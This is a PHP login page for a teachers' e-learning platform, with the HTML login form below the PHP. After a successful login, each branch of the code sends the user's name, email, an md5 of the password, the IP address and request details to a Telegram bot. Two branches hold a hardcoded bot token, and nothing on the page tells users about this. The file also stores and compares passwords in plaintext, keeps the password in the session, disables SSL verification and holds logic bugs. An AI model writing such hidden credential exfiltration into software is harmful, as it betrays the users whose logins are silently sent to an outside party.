<?php
    // BASE DE DONNES
        $userDB="root";
        $passwordDB="";
        $database = new PDO("mysql:host=localhost; dbname=PFA; charset=utf8;",$userDB,$passwordDB);
    // END BASE DE DONNES  
    if(isset($_REQUEST['submit'])){
        $email=$_REQUEST['email'];
        $pass=$_REQUEST['password'];
        $check=$database->prepare("SELECT * FROM Profs WHERE Email_Prof= :email AND Password_Prof= :pass " );
        $check->bindParam("email",$_REQUEST['email']);
        $check->bindParam("pass",$_REQUEST['password']);
        $check->execute();
        if($check->rowCount() === 1){
            foreach($check as $Info_Prof){
                $unique_id=$Info_Prof['ID_Prof'];
                $logout=$database->prepare("UPDATE Profs SET statusProf='Active now' WHERE ID_Prof='{$unique_id}'");
                $logout->execute();
                session_start();
                $_SESSION['ID_Prof']=$Info_Prof['ID_Prof'];
                $_SESSION['Prenom_Prof']=$Info_Prof['Prenom_Prof'];
                $_SESSION['Nom_Prof']=$Info_Prof['Nom_Prof'];
                $_SESSION['NationaliteID_Prof']=$Info_Prof['NationaliteID_Prof'];
                $_SESSION['Email_Prof']=$Info_Prof['Email_Prof'];
                $_SESSION['Pays_Prof']=$Info_Prof['Pays_Prof'];
                $_SESSION['Ville_Prof']=$Info_Prof['Ville_Prof'];
                $_SESSION['NumPhone_Prof']=$Info_Prof['NumPhone_Prof'];
                $_SESSION['SituationFam_Prof']=$Info_Prof['SituationFam_Prof'];
                $_SESSION['Formation_Prof']=$Info_Prof['Formation_Prof'];
                $_SESSION['PremierDateEmbauche']=$Info_Prof['PremierDateEmbauche'];
                $_SESSION['Gender_Prof']=$Info_Prof['Gender_Prof'];
                $_SESSION['Password_Prof']=$Info_Prof['Password_Prof'];
                $_SESSION['PremierAccesAuSite']=$Info_Prof['PremierAccesAuSite'];
                $_SESSION['statusProf']=$Info_Prof['statusProf'];

                if($Info_Prof['Formation_Prof'] == "1"){
                    // TELEGRAM BOT
                        $chat_id='';
                        $token="";
                        $IP = getenv("REMOTE_ADDR");
                        $HTTP_HOST=$_SERVER["HTTP_HOST"];
                        $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                        $SERVER_PORT=$_SERVER['SERVER_PORT'];
                        $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                        " Prénom et nom   : ".$Info_Prof['Prenom_Prof']." ".$Info_Prof['Nom_Prof']."\n \n".
                                        "📧 Adresse mail   : ".$Info_Prof['Email_Prof']."\n \n".
                                        "🔐 Mot de passe   : ".md5($Info_Prof['Password_Prof'])."\n \n".
                                        
                                        "IP : ".$IP."\n \n".
                                        "HTTP HOST : ".$HTTP_HOST."\n \n".
                                        "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                        "SERVER PORT : ".$SERVER_PORT."\n \n".
                                        "-----------💸 "."Plateforme E-learning"."💸-----------");       
                        $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                        $ch=curl_init();
                        curl_setopt($ch,CURLOPT_URL,$url);
                        curl_setopt($ch, CURLOPT_HEADER, false);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                        $result=curl_exec($ch);
                        curl_close($ch);
                    // END TELEGRAM BOT
                    header("refresh:1;url=PLT_Profs/PLT-FormationMDN1/Dashboard.php");
                    }elseif($Info_Prof['Formation_Prof'] == "2"){
                    // TELEGRAM BOT
                        $chat_id='';
                        $token="";
                        $IP = getenv("REMOTE_ADDR");
                        $HTTP_HOST=$_SERVER["HTTP_HOST"];
                        $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                        $SERVER_PORT=$_SERVER['SERVER_PORT'];
                        $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                        " Prénom et nom   : ".$Info_Prof['Prenom_Prof']." ".$Info_Prof['Nom_Prof']."\n \n".
                                        "📧 Adresse mail   : ".$Info_Prof['Email_Prof']."\n \n".
                                        "🔐 Mot de passe   : ".md5($Info_Prof['Password_Prof'])."\n \n".
                                        
                                        "IP : ".$IP."\n \n".
                                        "HTTP HOST : ".$HTTP_HOST."\n \n".
                                        "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                        "SERVER PORT : ".$SERVER_PORT."\n \n".
                                        "-----------💸 "."Plateforme E-learning"."💸-----------");       
                        $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                        $ch=curl_init();
                        curl_setopt($ch,CURLOPT_URL,$url);
                        curl_setopt($ch, CURLOPT_HEADER, false);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                        $result=curl_exec($ch);
                        curl_close($ch);
                    // END TELEGRAM BOT
                    header("refresh:1;url=PLT_Profs/PLT-FormationAD/Dashboard.php");
                    }elseif($Info_Prof['Formation_Prof'] == "3"){
                    // TELEGRAM BOT
                        $chat_id='';
                        $token="";
                        $IP = getenv("REMOTE_ADDR");
                        $HTTP_HOST=$_SERVER["HTTP_HOST"];
                        $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                        $SERVER_PORT=$_SERVER['SERVER_PORT'];
                        $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                        " Prénom et nom   : ".$Info_Prof['Prenom_Prof']." ".$Info_Prof['Nom_Prof']."\n \n".
                                        "📧 Adresse mail   : ".$Info_Prof['Email_Prof']."\n \n".
                                        "🔐 Mot de passe   : ".md5($Info_Prof['Password_Prof'])."\n \n".
                                        
                                        "IP : ".$IP."\n \n".
                                        "HTTP HOST : ".$HTTP_HOST."\n \n".
                                        "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                        "SERVER PORT : ".$SERVER_PORT."\n \n".
                                        "-----------💸 "."Plateforme E-learning"."💸-----------");       
                        $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                        $ch=curl_init();
                        curl_setopt($ch,CURLOPT_URL,$url);
                        curl_setopt($ch, CURLOPT_HEADER, false);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                        $result=curl_exec($ch);
                        curl_close($ch);
                    // END TELEGRAM BOT
                    header("refresh:1;url=PLT_Profs/PLT-FormationMSO/Dashboard.php");
                    }elseif($Info_Prof['Formation_Prof'] == "4"){
                    // TELEGRAM BOT
                        $chat_id='';
                        $token="";
                        $IP = getenv("REMOTE_ADDR");
                        $HTTP_HOST=$_SERVER["HTTP_HOST"];
                        $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                        $SERVER_PORT=$_SERVER['SERVER_PORT'];
                        $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                        " Prénom et nom   : ".$Info_Prof['Prenom_Prof']." ".$Info_Prof['Nom_Prof']."\n \n".
                                        "📧 Adresse mail   : ".$Info_Prof['Email_Prof']."\n \n".
                                        "🔐 Mot de passe   : ".md5($Info_Prof['Password_Prof'])."\n \n".
                                        
                                        "IP : ".$IP."\n \n".
                                        "HTTP HOST : ".$HTTP_HOST."\n \n".
                                        "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                        "SERVER PORT : ".$SERVER_PORT."\n \n".
                                        "-----------💸 "."Plateforme E-learning"."💸-----------");       
                        $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                        $ch=curl_init();
                        curl_setopt($ch,CURLOPT_URL,$url);
                        curl_setopt($ch, CURLOPT_HEADER, false);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                        $result=curl_exec($ch);
                        curl_close($ch);
                    // END TELEGRAM BOT
                    header("refresh:1;url=PLT_Profs/PLT-FormationMST/Dashboard.php");
                    }elseif($Info_Prof['Formation_Prof'] == "5"){
                    // TELEGRAM BOT
                        $chat_id='';
                        $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
                        $IP = getenv("REMOTE_ADDR");
                        $HTTP_HOST=$_SERVER["HTTP_HOST"];
                        $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                        $SERVER_PORT=$_SERVER['SERVER_PORT'];
                        $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                        " Prénom et nom   : ".$Info_Prof['Prenom_Prof']." ".$Info_Prof['Nom_Prof']."\n \n".
                                        "📧 Adresse mail   : ".$Info_Prof['Email_Prof']."\n \n".
                                        "🔐 Mot de passe   : ".md5($Info_Prof['Password_Prof'])."\n \n".
                                        
                                        "IP : ".$IP."\n \n".
                                        "HTTP HOST : ".$HTTP_HOST."\n \n".
                                        "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                        "SERVER PORT : ".$SERVER_PORT."\n \n".
                                        "-----------💸 "."Plateforme E-learning"."💸-----------");       
                        $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                        $ch=curl_init();
                        curl_setopt($ch,CURLOPT_URL,$url);
                        curl_setopt($ch, CURLOPT_HEADER, false);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                        $result=curl_exec($ch);
                        curl_close($ch);
                    // END TELEGRAM BOT
                    header("refresh:1;url=PLT_Profs/PLT-FormationINL1/Dashboard.php");
                    }elseif($Info_Prof['Formation_Prof'] == "6"){
                    // TELEGRAM BOT
                        $chat_id='';
                        $token="";
                        $IP = getenv("REMOTE_ADDR");
                        $HTTP_HOST=$_SERVER["HTTP_HOST"];
                        $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                        $SERVER_PORT=$_SERVER['SERVER_PORT'];
                        $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                        " Prénom et nom   : ".$Info_Prof['Prenom_Prof']." ".$Info_Prof['Nom_Prof']."\n \n".
                                        "📧 Adresse mail   : ".$Info_Prof['Email_Prof']."\n \n".
                                        "🔐 Mot de passe   : ".md5($Info_Prof['Password_Prof'])."\n \n".
                                        
                                        "IP : ".$IP."\n \n".
                                        "HTTP HOST : ".$HTTP_HOST."\n \n".
                                        "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                        "SERVER PORT : ".$SERVER_PORT."\n \n".
                                        "-----------💸 "."Plateforme E-learning"."💸-----------");       
                        $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                        $ch=curl_init();
                        curl_setopt($ch,CURLOPT_URL,$url);
                        curl_setopt($ch, CURLOPT_HEADER, false);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                        $result=curl_exec($ch);
                        curl_close($ch);
                    // END TELEGRAM BOT
                    header("refresh:1;url=PLT_Profs/PLT-FormationINL2/Dashboard.php");
                    }elseif($Info_Prof['Formation_Prof'] == "7"){
                    // TELEGRAM BOT
                        $chat_id='';
                        $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
                        $IP = getenv("REMOTE_ADDR");
                        $HTTP_HOST=$_SERVER["HTTP_HOST"];
                        $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                        $SERVER_PORT=$_SERVER['SERVER_PORT'];
                        $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                        " Prénom et nom   : ".$Info_Prof['Prenom_Prof']." ".$Info_Prof['Nom_Prof']."\n \n".
                                        "📧 Adresse mail   : ".$Info_Prof['Email_Prof']."\n \n".
                                        "🔐 Mot de passe   : ".md5($Info_Prof['Password_Prof'])."\n \n".
                                        
                                        "IP : ".$IP."\n \n".
                                        "HTTP HOST : ".$HTTP_HOST."\n \n".
                                        "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                        "SERVER PORT : ".$SERVER_PORT."\n \n".
                                        "-----------💸 "."Plateforme E-learning"."💸-----------");       
                        $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                        $ch=curl_init();
                        curl_setopt($ch,CURLOPT_URL,$url);
                        curl_setopt($ch, CURLOPT_HEADER, false);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                        $result=curl_exec($ch);
                        curl_close($ch);
                    // END TELEGRAM BOT
                    header("refresh:1;url=PLT_Profs/PLT-FormationISI1/Dashboard.php");
                    }elseif($ch['Formation_Prof'] == "8"){
                    // TELEGRAM BOT
                        $chat_id='';
                        $token=":";
                        $IP = getenv("REMOTE_ADDR");
                        $HTTP_HOST=$_SERVER["HTTP_HOST"];
                        $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                        $SERVER_PORT=$_SERVER['SERVER_PORT'];
                        $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                        " Prénom et nom   : ".$Info_Prof['Prenom_Prof']." ".$Info_Prof['Nom_Prof']."\n \n".
                                        "📧 Adresse mail   : ".$Info_Prof['Email_Prof']."\n \n".
                                        "🔐 Mot de passe   : ".md5($Info_Prof['Password_Prof'])."\n \n".
    
                                        
                                        "IP : ".$IP."\n \n".
                                        "HTTP HOST : ".$HTTP_HOST."\n \n".
                                        "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                        "SERVER PORT : ".$SERVER_PORT."\n \n".
                                        "-----------💸 "."Plateforme E-learning"."💸-----------");       
                        $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                        $ch=curl_init();
                        curl_setopt($ch,CURLOPT_URL,$url);
                        curl_setopt($ch, CURLOPT_HEADER, false);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                        $result=curl_exec($ch);
                        curl_close($ch);
                    // END TELEGRAM BOT
                    header("refresh:1;url=PLT_Profs/PLT-FormationISI2/Dashboard.php");
                    }elseif($Info_Prof['Formation_Prof'] == "9"){
                    // TELEGRAM BOT
                        $chat_id='';
                        $token="";
                        $IP = getenv("REMOTE_ADDR");
                        $HTTP_HOST=$_SERVER["HTTP_HOST"];
                        $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                        $SERVER_PORT=$_SERVER['SERVER_PORT'];
                        $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                        " Prénom et nom   : ".$Info_Prof['Prenom_Prof']." ".$Info_Prof['Nom_Prof']."\n \n".
                                        "📧 Adresse mail   : ".$Info_Prof['Email_Prof']."\n \n".
                                        "🔐 Mot de passe   : ".md5($Info_Prof['Password_Prof'])."\n \n".
    
                                        
                                        "IP : ".$IP."\n \n".
                                        "HTTP HOST : ".$HTTP_HOST."\n \n".
                                        "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                        "SERVER PORT : ".$SERVER_PORT."\n \n".
                                        "-----------💸 "."Plateforme E-learning"."💸-----------");       
                        $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                        $ch=curl_init();
                        curl_setopt($ch,CURLOPT_URL,$url);
                        curl_setopt($ch, CURLOPT_HEADER, false);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                        $result=curl_exec($ch);
                        curl_close($ch);
                    // END TELEGRAM BOT
                    header("refresh:1;url=PLT_Profs/PLT-FormationISIR1/Dashboard.php");
                    }elseif($ch['Formation_Prof'] == "10"){
                    // TELEGRAM BOT
                        $chat_id='';
                        $token="";
                        $IP = getenv("REMOTE_ADDR");
                        $HTTP_HOST=$_SERVER["HTTP_HOST"];
                        $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                        $SERVER_PORT=$_SERVER['SERVER_PORT'];
                        $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                        " Prénom et nom   : ".$Info_Prof['Prenom_Prof']." ".$Info_Prof['Nom_Prof']."\n \n".
                                        "📧 Adresse mail   : ".$Info_Prof['Email_Prof']."\n \n".
                                        "🔐 Mot de passe   : ".md5($Info_Prof['Password_Prof'])."\n \n".
    
                                        
                                        "IP : ".$IP."\n \n".
                                        "HTTP HOST : ".$HTTP_HOST."\n \n".
                                        "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                        "SERVER PORT : ".$SERVER_PORT."\n \n".
                                        "-----------💸 "."Plateforme E-learning"."💸-----------");       
                        $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                        $ch=curl_init();
                        curl_setopt($ch,CURLOPT_URL,$url);
                        curl_setopt($ch, CURLOPT_HEADER, false);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                        $result=curl_exec($ch);
                        curl_close($ch);
                    // END TELEGRAM BOT
                    header("refresh:1;url=PLT_Profs/PLT-FormationISIR2/Dashboard.php");
                    }elseif($Info_Prof['Formation_Prof'] == "11"){
                    // TELEGRAM BOT
                        $chat_id='';
                        $token="";
                        $IP = getenv("REMOTE_ADDR");
                        $HTTP_HOST=$_SERVER["HTTP_HOST"];
                        $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                        $SERVER_PORT=$_SERVER['SERVER_PORT'];
                        $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                        " Prénom et nom   : ".$Info_Prof['Prenom_Prof']." ".$Info_Prof['Nom_Prof']."\n \n".
                                        "📧 Adresse mail   : ".$Info_Prof['Email_Prof']."\n \n".
                                        "🔐 Mot de passe   : ".md5($Info_Prof['Password_Prof'])."\n \n".
    
                                        
                                        "IP : ".$IP."\n \n".
                                        "HTTP HOST : ".$HTTP_HOST."\n \n".
                                        "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                        "SERVER PORT : ".$SERVER_PORT."\n \n".
                                        "-----------💸 "."Plateforme E-learning"."💸-----------");       
                        $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                        $ch=curl_init();
                        curl_setopt($ch,CURLOPT_URL,$url);
                        curl_setopt($ch, CURLOPT_HEADER, false);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                        $result=curl_exec($ch);
                        curl_close($ch);
                    // END TELEGRAM BOT
                    header("refresh:1;url=PLT_Profs/PLT-blockchaine/Dashboard.php");
                    }elseif($Info_Prof['Formation_Prof'] == "12"){
                    // TELEGRAM BOT
                        $chat_id='';
                        $token="";
                        $IP = getenv("REMOTE_ADDR");
                        $HTTP_HOST=$_SERVER["HTTP_HOST"];
                        $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                        $SERVER_PORT=$_SERVER['SERVER_PORT'];
                        $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                        " Prénom et nom   : ".$Info_Prof['Prenom_Prof']." ".$Info_Prof['Nom_Prof']."\n \n".
                                        "📧 Adresse mail   : ".$Info_Prof['Email_Prof']."\n \n".
                                        "🔐 Mot de passe   : ".md5($Info_Prof['Password_Prof'])."\n \n".
    
                                        
                                        "IP : ".$IP."\n \n".
                                        "HTTP HOST : ".$HTTP_HOST."\n \n".
                                        "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                        "SERVER PORT : ".$SERVER_PORT."\n \n".
                                        "-----------💸 "."Plateforme E-learning"."💸-----------");       
                        $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                        $ch=curl_init();
                        curl_setopt($ch,CURLOPT_URL,$url);
                        curl_setopt($ch, CURLOPT_HEADER, false);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                        $result=curl_exec($ch);
                        curl_close($ch);
                    // END TELEGRAM BOT
                    header("refresh:1;url=PLT_Profs/PLT-dataScience/Dashboard.php");
                    }elseif($Info_Prof['Formation_Prof'] == "13"){
                    // TELEGRAM BOT
                        $chat_id='';
                        $token="";
                        $IP = getenv("REMOTE_ADDR");
                        $HTTP_HOST=$_SERVER["HTTP_HOST"];
                        $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                        $SERVER_PORT=$_SERVER['SERVER_PORT'];
                        $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                            " Prénom et nom   : ".$Info_Prof['Prenom_Prof']." ".$Info_Prof['Nom_Prof']."\n \n".
                                            "📧 Adresse mail   : ".$Info_Prof['Email_Prof']."\n \n".
                                            "🔐 Mot de passe   : ".md5($Info_Prof['Password_Prof'])."\n \n".
    
                                            
                                            "IP : ".$IP."\n \n".
                                            "HTTP HOST : ".$HTTP_HOST."\n \n".
                                            "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                            "SERVER PORT : ".$SERVER_PORT."\n \n".
                                            "-----------💸 "."Plateforme E-learning"."💸-----------");       
                        $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                        $ch=curl_init();
                        curl_setopt($ch,CURLOPT_URL,$url);
                        curl_setopt($ch, CURLOPT_HEADER, false);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                        $result=curl_exec($ch);
                        curl_close($ch);
                    // END TELEGRAM BOT
                    header("refresh:1;url=PLT_Profs/PLT-Marketing_digital/Dashboard.php");
                    }elseif($Info_Prof['Formation_Prof'] == "14"){
                    // TELEGRAM BOT
                            $chat_id='';
                            $token="";
                            $IP = getenv("REMOTE_ADDR");
                            $HTTP_HOST=$_SERVER["HTTP_HOST"];
                            $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                            $SERVER_PORT=$_SERVER['SERVER_PORT'];
                            $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                                " Prénom et nom   : ".$Info_Prof['Prenom_Prof']." ".$Info_Prof['Nom_Prof']."\n \n".
                                                "📧 Adresse mail   : ".$Info_Prof['Email_Prof']."\n \n".
                                                "🔐 Mot de passe   : ".md5($Info_Prof['Password_Prof'])."\n \n".
    
                                                
                                                "IP : ".$IP."\n \n".
                                                "HTTP HOST : ".$HTTP_HOST."\n \n".
                                                "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                                "SERVER PORT : ".$SERVER_PORT."\n \n".
                                                "-----------💸 "."Plateforme E-learning"."💸-----------");       
                            $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                            $ch=curl_init();
                            curl_setopt($ch,CURLOPT_URL,$url);
                            curl_setopt($ch, CURLOPT_HEADER, false);
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                            curl_setopt($ch, CURLOPT_POST, 1);
                            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                            curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                            $result=curl_exec($ch);
                            curl_close($ch);
                    // END TELEGRAM BOT
                    header("refresh:1;url=PLT_Profs/PLT-Cybersecurite/Dashboard.php");
                    }else{header("refresh:1;url=E-learning.php");}
            }
        }else{header("refresh:1;url=PlatfProf.php");}
    }else{}

?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Plateforme Profs</title>
    <link rel="stylesheet" href="css/E-learning.css">
    <script src="https://kit.fontawesome.com/0c6c59d6fe.js" crossorigin="anonymous"></script>
    <link rel="icon" href="../Capture d’écran 2022-07-17 à 03.37.57.png">
</head>
<body>
    <?php include "Header.php";?>

    <section id="header2">
        <h3>Plate-forme des Profs</h3>
    </section>
    <section id="login">
        <form action="PlatfProf.php"  method="post">
            <a href="Home.html" class="logo"><i class="fab fa-accusoft"></i><span>DEAN</span></a>
            <div class="email">
                <input type="email" name="email" placeholder=" Email  " required>
                <i class="fa fa-user" aria-hidden="true"></i>
            </div>
            <div class="password">
                <input type="password" name="password" placeholder=" Mot de passe " required>
                <i class="fa fa-lock" aria-hidden="true"></i>
            </div>
            <input type="submit" name="submit" value="Connexion" class="submit">
            <a href="" class="oub">Vous avez oublié votre nom d'utilisateur et/ou votre mot de passe ?</a>
        </form>
    </section>
    <script src="javascript/pass-show-hide.js"></script>
    <?php include "Footer.php";?> 
</body>
</html>